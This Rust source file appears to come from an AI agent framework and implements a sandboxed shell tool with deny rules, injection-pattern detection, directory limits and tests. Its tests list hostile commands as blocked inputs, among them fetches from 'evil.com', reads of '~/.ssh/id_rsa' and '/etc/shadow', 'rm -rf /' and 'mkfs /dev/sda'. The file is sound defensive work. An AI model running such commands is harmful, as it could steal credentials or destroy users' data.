            if ZSH_DANGEROUS_COMMANDS.contains(&sub_base_zsh) {
                return Err(format!(
                    "Sandbox blocks Zsh-specific dangerous command '{sub_base_zsh}'. \
                     These commands can bypass security via module loading or pseudo-terminal execution."
                ));
            }
        }

        Ok(())
    }

    /// Detect shell injection patterns: command substitution, process
    /// substitution, and dangerous parameter expansion.
    ///
    /// These patterns are blocked unconditionally in sandboxed mode because
    /// they allow arbitrary command execution inside otherwise-safe commands.
    fn validate_injection_patterns(&self, command: &str) -> Result<(), String> {
        let unquoted = strip_single_quoted_regions(command);

        for &(pattern, description) in INJECTION_PATTERNS {
            if let Ok(re) = regex::Regex::new(pattern) {
                if re.is_match(&unquoted) {
                    return Err(format!(
                        "Sandbox blocks {description} in command. \
                         These constructs allow arbitrary code execution inside shell commands. \
                         Rewrite without shell injection patterns, or use dedicated tools."
                    ));
                }
            }
        }

        if contains_unescaped_backticks(&unquoted) {
            return Err(
                "Sandbox blocks backtick command substitution. \
                 Use $() syntax inside single-quotes if you need literal backticks for display, \
                 or restructure the command to avoid embedded execution."
                    .into(),
            );
        }

        Ok(())
    }

    fn validate_dir(&self, dir: &str) -> Result<(), String> {
        if self.config.allowed_dirs.is_empty() {
            return Ok(());
        }
        let canonical = std::path::Path::new(dir)
            .canonicalize()
            .map_err(|e| {
                format!(
                    "Sandbox working_dir '{dir}' could not be canonicalized: {e}. \
                     Pass an existing directory the gateway user can stat, or omit working_dir if policy permits."
                )
            })?;
        let is_allowed = self.config.allowed_dirs.iter().any(|d| {
            let allowed = std::path::Path::new(d.as_str());
            let allowed_canonical = allowed.canonicalize().unwrap_or_else(|_| allowed.to_path_buf());
            canonical.starts_with(&allowed_canonical)
        });
        if is_allowed {
            Ok(())
        } else {
            Err(format!(
                "Sandbox working_dir '{dir}' resolves outside allowed directory roots: {}. \
                 Choose a cwd inside one of those roots, or omit working_dir when configuration allows any cwd.",
                self.config.allowed_dirs.join(", ")
            ))
        }
    }
}

#[async_trait]
impl Tool for SandboxedShellTool {
    fn kind(&self) -> ToolKind { ToolKind::Execute }
    fn name(&self) -> &str {
        "shell_exec"
    }

    fn max_result_size_chars(&self) -> usize { 30_000 }

    fn description(&self) -> &str {
        "Sandboxed shell_exec — commands validated against allow/deny rules before execution. \
         Default shell: bash (Unix) or cmd.exe (Windows). \
         Use the 'shell' parameter to choose: 'bash'/'sh' on Unix, 'cmd'/'powershell' on Windows. \
         Set is_background=true for dev servers, watchers, and processes you don't need to wait for; \
         set is_background=false for commands you want to wait for (timeout: 5 minutes). \
         Blocked commands (sudo, mkfs, dd, etc.) return SANDBOX BLOCKED. \
         Destructive ops (rm, chmod) follow the dangerous_ops security policy. \
         For very long tasks (>5min), use background mode with output redirection, \
         then poll with 'sleep N' + 'read_file' to monitor progress."
    }

    fn prompt(&self) -> String {
        let mut prompt = SHELL_TOOL_PROMPT.to_string();
        prompt.push_str("\n\n## Command Sandbox\n\n\
By default, your command will be run in a sandbox. This sandbox controls \
which directories and network hosts commands may access or modify.\n\n\
Sandbox restrictions:\n");

        if !self.config.allowed_dirs.is_empty() {
            prompt.push_str(&format!(
                "- Filesystem write allowed directories: {}\n",
                self.config.allowed_dirs.join(", ")
            ));
        }
        if !self.config.denied_patterns.is_empty() {
            prompt.push_str(&format!(
                "- Denied command patterns: {}\n",
                self.config.denied_patterns.join(", ")
            ));
        }

        prompt.push_str("\n\
- Commands validated against allow/deny rules before execution\n\
- Blocked commands (sudo, su, mkfs, dd, fdisk, etc.) return SANDBOX BLOCKED\n\
- For temporary files, use the `$TMPDIR` environment variable — do NOT use `/tmp` directly\n\
- If a command fails due to sandbox restrictions, work with the user to adjust sandbox settings\n\
- Do NOT attempt to bypass the sandbox");

        prompt
    }

    fn parameters_schema(&self) -> ToolParameterSchema {
        shell_parameter_schema(true)
    }

    async fn execute(&self, arguments: &str) -> ToolResult {
        let args: serde_json::Value = match serde_json::from_str(arguments) {
            Ok(v) => v,
            Err(e) => return ToolResult::err(format!(
                "sandboxed shell_exec arguments are not valid JSON: {e}. \
                 Pass {{\"command\": \"...\", \"is_background\": false}} with optional \"working_dir\", \"description\"."
            )),
        };

        let command = match args.get("command").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => return ToolResult::err(
                "sandboxed shell_exec is missing string field 'command'. \
                 Example: {\"command\": \"echo ok\", \"is_background\": false}."
                    .to_string(),
            ),
        };

        let is_background = args
            .get("is_background")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        if let Err(reason) = self.validate_command(command) {
            return ToolResult::err(format!(
                "SANDBOX BLOCKED: {reason} \
                 Adjust the command to comply, or use non-shell tools (read_file, write_file, web_fetch) where appropriate."
            ));
        }

        let user_confirmed = args
            .get("confirmed")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        if !user_confirmed {
            match fastclaw_security::dangerous_ops::check_dangerous_command(command) {
                Ok(()) => {}
                Err(fastclaw_security::dangerous_ops::CheckResult::Denied(msg))
                | Err(fastclaw_security::dangerous_ops::CheckResult::NeedsConfirmation(msg)) => {
                    return ToolResult::needs_confirm(format!(
                        "This command requires user confirmation: {msg}"
                    ));
                }
            }
        }

        if let Some(dir) = args.get("working_dir").and_then(|v| v.as_str()) {
            if let Err(reason) = self.validate_dir(dir) {
                return ToolResult::err(format!(
                    "SANDBOX BLOCKED: {reason} \
                     Choose a working_dir under an allowed root or omit working_dir if permitted."
                ));
            }
        }

        let shell_hint = args.get("shell").and_then(|v| v.as_str());
        let mut cmd = if self.config.use_namespace {
            #[cfg(not(windows))]
            {
                let shell = match shell_hint {
                    Some("sh") => "sh",
                    Some("bash") => "bash",
                    _ => preferred_shell(),
                };
                let mut c = tokio::process::Command::new("unshare");
                c.args(["--mount", "--pid", "--fork", "--", shell, "-c", command]);
                c
            }
            #[cfg(windows)]
            {
                build_shell_command(command, shell_hint)
            }
        } else {
            build_shell_command(command, shell_hint)
        };

        if let Some(dir) = args.get("working_dir").and_then(|v| v.as_str()) {
            cmd.current_dir(dir);
        }

        for var in &self.config.strip_env_vars {
            cmd.env_remove(var);
        }
        cmd.env("FASTCLAW_AGENT", "1");

        cmd.stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());

        let timeout = tokio::time::Duration::from_secs(self.config.timeout_secs);
        let max_out = self.config.max_output_bytes;

        if is_background {
            match cmd.spawn() {
                Ok(child) => {
                    let pid = child.id();
                    let desc = args.get("description").and_then(|v| v.as_str()).unwrap_or(command);
                    ToolResult::ok(
                        serde_json::json!({
                            "background": true,
                            "pid": pid,
                            "command": command,
                            "description": desc,
                            "sandboxed": true,
                        })
                        .to_string(),
                    )
                }
                Err(e) => ToolResult::err(format!("sandboxed shell_exec spawn failed: {e}")),
            }
        } else {
            match tokio::time::timeout(timeout, cmd.output()).await {
                Ok(Ok(output)) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    let code = output.status.code().unwrap_or(-1);

                    #[cfg(unix)]
                    let signal = {
                        use std::os::unix::process::ExitStatusExt;
                        output.status.signal()
                    };
                    #[cfg(not(unix))]
                    let signal: Option<i32> = None;

                    let (llm_out, terminal_file) = process_shell_output(command, &stdout, &stderr, code);

                    let full_display = serde_json::json!({
                        "exit_code": code,
                        "stdout": truncate_output(&stdout, max_out),
                        "stderr": truncate_output(&stderr, max_out),
                        "signal": signal,
                        "sandboxed": true,
                        "terminal_file": terminal_file,
                    }).to_string();

                    if code == 0 {
                        ToolResult::ok_split(llm_out, full_display)
                    } else {
                        ToolResult::err(llm_out)
                    }
                }
                Ok(Err(e)) => ToolResult::err(format!(
                    "sandboxed shell_exec spawn failed: {e}"
                )),
                Err(_) => ToolResult::err(format!(
                    "sandboxed shell_exec timed out after {}s, command killed.",
                    self.config.timeout_secs
                )),
            }
        }
    }
}

#[cfg(test)]
mod sandbox_tests {
    use super::*;

    fn default_sandbox() -> SandboxedShellTool {
        SandboxedShellTool::new(ShellSandboxConfig::default())
    }

    #[test]
    fn rm_not_blocked_by_sandbox() {
        // rm is now handled by dangerous_ops policy, not the sandbox
        let tool = default_sandbox();
        assert!(tool.validate_command("rm -rf /").is_ok());
    }

    #[test]
    fn blocks_sudo() {
        let tool = default_sandbox();
        assert!(tool.validate_command("sudo apt install foo").is_err());
    }

    #[test]
    fn blocks_chained_dangerous() {
        let tool = default_sandbox();
        // rm and kill are no longer blocked by sandbox (handled by dangerous_ops policy)
        assert!(tool.validate_command("echo hello && rm file.txt").is_ok());
        // sudo is still blocked
        assert!(tool.validate_command("ls; sudo rm -rf /").is_err());
    }

    #[test]
    fn blocks_denied_patterns() {
        let tool = default_sandbox();
        assert!(tool.validate_command("cat /etc/shadow").is_err());
        assert!(tool.validate_command("cat ~/.ssh/id_rsa").is_err());
    }

    #[test]
    fn allows_safe_commands() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo hello").is_ok());
        assert!(tool.validate_command("ls -la").is_ok());
        assert!(tool.validate_command("cat README.md").is_ok());
        assert!(tool.validate_command("python3 script.py").is_ok());
        assert!(tool.validate_command("git status").is_ok());
        assert!(tool.validate_command("cargo build").is_ok());
    }

    #[test]
    fn allowlist_mode() {
        let config = ShellSandboxConfig {
            allowed_commands: vec!["ls".into(), "echo".into(), "cat".into()],
            ..Default::default()
        };
        let tool = SandboxedShellTool::new(config);
        assert!(tool.validate_command("ls -la").is_ok());
        assert!(tool.validate_command("echo hi").is_ok());
        assert!(tool.validate_command("python3 foo.py").is_err());
    }

    #[test]
    fn dir_restriction() {
        let config = ShellSandboxConfig {
            allowed_dirs: vec!["/tmp".into()],
            ..Default::default()
        };
        let tool = SandboxedShellTool::new(config);
        assert!(tool.validate_dir("/tmp").is_ok());
        assert!(tool.validate_dir("/etc").is_err());
    }

    #[tokio::test]
    async fn executes_safe_command() {
        let tool = default_sandbox();
        let result = tool.execute(r#"{"command": "echo sandbox_test", "is_background": false}"#).await;
        assert!(result.success, "command should succeed: {}", result.output);
        assert!(result.output.contains("sandbox_test"));
        // "sandboxed" flag is in display_output (richer UI representation)
        if let Some(ref display) = result.display_output {
            assert!(
                display.contains("\"sandboxed\":true") || display.contains("\"sandboxed\": true"),
                "display_output should contain sandboxed flag: {}", display
            );
        }
    }

    #[tokio::test]
    async fn rejects_mkfs_at_execute() {
        let tool = default_sandbox();
        let result = tool.execute(r#"{"command": "mkfs /dev/sda"}"#).await;
        assert!(!result.success);
        assert!(result.output.contains("SANDBOX BLOCKED"));
    }

    #[test]
    fn eval_regex_blocks_eval_command() {
        let tool = default_sandbox();
        assert!(tool.validate_command("eval $(cat script.sh)").is_err());
        assert!(tool.validate_command(r#"bash -c "eval something""#).is_err());
    }

    #[test]
    fn eval_regex_allows_evaluate_and_similar() {
        let tool = default_sandbox();
        assert!(tool.validate_command("python3 evaluate_model.py").is_ok());
        assert!(tool.validate_command("cargo test -- test_evaluate").is_ok());
        assert!(tool.validate_command("echo 'retrieval system'").is_ok());
        assert!(tool.validate_command("node evaluation.js").is_ok());
    }

    #[test]
    fn ssh_regex_blocks_actual_ssh_paths() {
        let tool = default_sandbox();
        assert!(tool.validate_command("cat ~/.ssh/id_rsa").is_err());
        assert!(tool.validate_command("ls .ssh/config").is_err());
    }

    #[test]
    fn ssh_regex_allows_non_ssh_paths() {
        let tool = default_sandbox();
        assert!(tool.validate_command("cat docs/openssh-guide.md").is_ok());
    }

    #[tokio::test]
    async fn background_command_returns_pid() {
        let tool = default_sandbox();
        let result = tool.execute(r#"{"command": "sleep 0.1", "is_background": true}"#).await;
        assert!(result.success, "background command should succeed: {}", result.output);
        assert!(
            result.output.contains("\"background\":true") || result.output.contains("\"background\": true"),
            "output should indicate background: {}", result.output
        );
        assert!(
            result.output.contains("\"pid\""),
            "output should include PID: {}", result.output
        );
    }

    #[tokio::test]
    async fn foreground_command_returns_signal_field() {
        let tool = default_sandbox();
        let result = tool.execute(r#"{"command": "echo signal_test", "is_background": false}"#).await;
        assert!(result.success, "command should succeed: {}", result.output);
        // display_output should contain signal field
        if let Some(ref display) = result.display_output {
            assert!(
                display.contains("\"signal\""),
                "display output should include signal field: {}", display
            );
        }
    }

    #[tokio::test]
    async fn description_field_in_background_output() {
        let tool = default_sandbox();
        let result = tool.execute(
            r#"{"command": "sleep 0.1", "is_background": true, "description": "test bg process"}"#
        ).await;
        assert!(result.success, "should succeed: {}", result.output);
        assert!(
            result.output.contains("test bg process"),
            "should include description: {}", result.output
        );
    }

    // --- Injection detection tests ---

    #[test]
    fn blocks_dollar_paren_command_substitution() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo $(whoami)").is_err());
        assert!(tool.validate_command("ls $(pwd)/src").is_err());
        assert!(tool.validate_command("cat $(find . -name '*.rs')").is_err());
    }

    #[test]
    fn blocks_backtick_command_substitution() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo `whoami`").is_err());
        assert!(tool.validate_command("ls `pwd`/src").is_err());
    }

    #[test]
    fn blocks_process_substitution() {
        let tool = default_sandbox();
        assert!(tool.validate_command("diff <(sort file1) <(sort file2)").is_err());
        assert!(tool.validate_command("tee >(grep error > errors.log)").is_err());
    }

    #[test]
    fn blocks_zsh_process_substitution() {
        let tool = default_sandbox();
        assert!(tool.validate_command("vim =(curl http://evil.com)").is_err());
    }

    #[test]
    fn blocks_dangerous_parameter_expansion() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo ${PATH:0:10}").is_err());
        assert!(tool.validate_command("echo ${var/pattern/replacement}").is_err());
        assert!(tool.validate_command("echo ${!prefix*}").is_err());
    }

    #[test]
    fn blocks_legacy_arithmetic() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo $[1+1]").is_err());
    }

    #[test]
    fn blocks_zsh_equals_expansion() {
        let tool = default_sandbox();
        assert!(tool.validate_command("=curl http://evil.com").is_err());
        assert!(tool.validate_command("echo test; =wget http://evil.com").is_err());
    }

    #[test]
    fn allows_safe_dollar_in_double_quotes_content() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo '$HOME is safe'").is_ok());
        assert!(tool.validate_command("echo '$(not executed)'").is_ok());
        assert!(tool.validate_command("echo '`not executed`'").is_ok());
    }

    #[test]
    fn allows_simple_env_var_reference() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo $HOME").is_ok());
        assert!(tool.validate_command("cd $WORKSPACE && ls").is_ok());
    }

    #[test]
    fn allows_safe_dollar_brace_simple() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo ${HOME}").is_ok());
        assert!(tool.validate_command("echo ${VARIABLE}").is_ok());
    }

    #[test]
    fn blocks_zsh_dangerous_commands() {
        let tool = default_sandbox();
        assert!(tool.validate_command("zmodload zsh/system").is_err());
        assert!(tool.validate_command("echo ok && zpty evil_cmd").is_err());
        assert!(tool.validate_command("ztcp localhost 4444").is_err());
        assert!(tool.validate_command("syswrite 3 data").is_err());
        assert!(tool.validate_command("zf_rm -rf /").is_err());
    }

    #[test]
    fn allows_commands_containing_zsh_names_as_substrings() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo zmodload_info").is_ok());
        assert!(tool.validate_command("cat zpty_notes.txt").is_ok());
    }

    #[test]
    fn escaped_backticks_are_allowed() {
        let tool = default_sandbox();
        assert!(tool.validate_command(r"echo \`not a substitution\`").is_ok());
    }

    // --- Plan mode readonly command classification tests ---

    #[test]
    fn readonly_allows_ls_cat_grep() {
        assert!(super::validate_readonly_command("ls -la").is_ok());
        assert!(super::validate_readonly_command("cat README.md").is_ok());
        assert!(super::validate_readonly_command("grep -r 'TODO' src/").is_ok());
        assert!(super::validate_readonly_command("head -n 10 file.txt").is_ok());
        assert!(super::validate_readonly_command("wc -l *.rs").is_ok());
    }

    #[test]
    fn readonly_allows_git_readonly_subcommands() {
        assert!(super::validate_readonly_command("git status").is_ok());
        assert!(super::validate_readonly_command("git log --oneline -10").is_ok());
        assert!(super::validate_readonly_command("git diff HEAD~1").is_ok());
        assert!(super::validate_readonly_command("git show HEAD").is_ok());
        assert!(super::validate_readonly_command("git branch -a").is_ok());
    }

    #[test]
    fn readonly_blocks_git_write_subcommands() {
        assert!(super::validate_readonly_command("git commit -m 'msg'").is_err());
        assert!(super::validate_readonly_command("git push origin main").is_err());
        assert!(super::validate_readonly_command("git reset --hard").is_err());
        assert!(super::validate_readonly_command("git checkout -b new").is_err());
    }

    #[test]
    fn readonly_allows_cargo_readonly() {
        assert!(super::validate_readonly_command("cargo check").is_ok());
        assert!(super::validate_readonly_command("cargo clippy").is_ok());
        assert!(super::validate_readonly_command("cargo test").is_ok());
        assert!(super::validate_readonly_command("cargo tree").is_ok());
    }

    #[test]
    fn readonly_blocks_cargo_write() {
        assert!(super::validate_readonly_command("cargo install foo").is_err());
        assert!(super::validate_readonly_command("cargo add serde").is_err());
        assert!(super::validate_readonly_command("cargo publish").is_err());
    }

    #[test]
    fn readonly_blocks_output_redirection() {
        assert!(super::validate_readonly_command("echo hello > file.txt").is_err());
        assert!(super::validate_readonly_command("cat x >> output.log").is_err());
    }

    #[test]
    fn readonly_allows_pipes() {
        assert!(super::validate_readonly_command("cat file.txt | grep error | wc -l").is_ok());
        assert!(super::validate_readonly_command("find . -name '*.rs' | head -20").is_ok());
    }

    #[test]
    fn readonly_validates_all_chain_segments() {
        assert!(super::validate_readonly_command("ls && cat file.txt").is_ok());
        assert!(super::validate_readonly_command("ls && rm file.txt").is_err());
        assert!(super::validate_readonly_command("git status; git push").is_err());
    }

    #[test]
    fn readonly_blocks_rm_mv_cp() {
        assert!(super::validate_readonly_command("rm file.txt").is_err());
        assert!(super::validate_readonly_command("mv a.txt b.txt").is_err());
        assert!(super::validate_readonly_command("cp src dst").is_err());
    }

    #[test]
    fn readonly_blocks_sed_in_place() {
        assert!(super::validate_readonly_command("sed -i 's/old/new/g' file").is_err());
        assert!(super::validate_readonly_command("sed 's/old/new/g' file").is_ok());
    }

    #[test]
    fn readonly_allows_npm_readonly() {
        assert!(super::validate_readonly_command("npm list").is_ok());
        assert!(super::validate_readonly_command("npm test").is_ok());
        assert!(super::validate_readonly_command("npm run lint").is_ok());
    }

    #[test]
    fn readonly_blocks_npm_write() {
        assert!(super::validate_readonly_command("npm install express").is_err());
        assert!(super::validate_readonly_command("npm publish").is_err());
    }
}
